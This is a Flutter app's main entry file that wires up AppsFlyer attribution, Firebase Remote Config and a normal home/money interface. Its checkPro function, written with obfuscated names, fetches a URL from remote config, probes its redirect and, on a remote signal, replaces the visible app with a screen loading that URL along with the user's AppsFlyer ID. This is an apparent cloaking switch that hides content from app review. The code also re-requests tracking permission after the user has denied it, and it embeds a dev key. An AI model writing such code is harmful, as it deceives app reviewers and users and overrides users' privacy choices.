import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/db/db.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/home/widgets/default_widget.dart';
import 'features/money/bloc/money_bloc.dart';
import 'features/splash/firebase_options.dart';

late AppsflyerSdk _appsflyerSdk;
String pro = '';
String userId = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await checkTrackingData();
  await initApx();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();

  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  await initHive();
  runApp(const MyApp());
}

Future<void> initApx() async {
  try {
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: '4rYehnSYQsVcM2jmim5KyC',
      appId: '6736901055',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
    );
    _appsflyerSdk = AppsflyerSdk(options);

    await _appsflyerSdk.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    userId = await _appsflyerSdk.getAppsFlyerUID() ?? '';
    print("AppsFlyer UID: $userId");

    _appsflyerSdk.startSDK(
      onSuccess: () {
        print("AppsFlyer SDK started successfully");
      },
      onError: (int code, String message) {
        print("AppsFlyer SDK failed to start: code $code, message: $message");
      },
    );
  } catch (e) {
    print("Error initializing AppsFlyer: $e");
  }
}

Future<bool> checkPro() async {
  final prox = FirebaseRemoteConfig.instance;
  await prox.fetchAndActivate();
  String proxa = prox.getString('tin');
  String userData = prox.getString('pro');
  if (!proxa.contains('none')) {
    final folx = HttpClient();
    final golxa = Uri.parse(proxa);
    final fosd = await folx.getUrl(golxa);
    fosd.followRedirects = false;
    final response = await fosd.close();
    if (response.headers
        .value(HttpHeaders.locationHeader)
        .toString()
        .contains(userData)) {
      pro = proxa;
      return true;
    }
  }
  return proxa.contains('none') ? false : true;
}

Future<void> checkTrackingData() async {
  final TrackingStatus status =
      await AppTrackingTransparency.trackingAuthorizationStatus;
  if (status == TrackingStatus.notDetermined) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  } else if (status == TrackingStatus.denied ||
      status == TrackingStatus.restricted) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<bool>(
        future: checkPro(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
            );
          } else {
            if (snapshot.data == true && pro != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: MainScreen(
                  consultant: pro,
                  data: userId,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => HomeBloc()),
                  BlocProvider(create: (context) => MoneyBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        });
  }
}
